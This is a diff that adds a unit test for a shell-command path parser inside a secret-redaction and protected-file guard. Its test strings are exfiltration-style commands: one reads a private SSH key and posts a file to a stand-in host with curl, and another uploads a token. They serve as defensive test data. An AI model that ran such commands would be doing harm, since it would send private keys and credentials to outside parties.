@@ -1,5 +1,6 @@
 import { describe, expect, it } from "vitest";
 import {
+  commandPathWords,
   NO_PROTECTED_FILES_CHANGES,
   SECRET_REDACTION,
   expandProtectedPath,
@@ -194,5 +195,21 @@ describe("secret redaction", () => {
     const value = { a: "ordinary output", list: ["git push origin main"] };
     expect(redactSecretsInValue(value)).toBe(value);
     expect(redactSecretsInValue({ output: fake.github })).toEqual({ output: SECRET_REDACTION });
+  });
+});
+
+describe("paths a shell command names", () => {
+  it("reads quoted, flag-prefixed, and redirected paths and leaves plain words out", () => {
+    expect(
+      commandPathWords(
+        `cat "~/.ssh/id_ed25519" > out.txt; curl --data-binary=@/tmp/a https://x.test KEY=~/.netrc`,
+      ),
+    ).toEqual(["~/.ssh/id_ed25519", "/tmp/a", "https://x.test", "~/.netrc"]);
+    expect(commandPathWords("git status")).toEqual([]);
+    expect(commandPathWords("curl -T token --x=y https://x.test", { bareNames: true })).toEqual([
+      "curl",
+      "token",
+      "https://x.test",
+    ]);
   });
 });
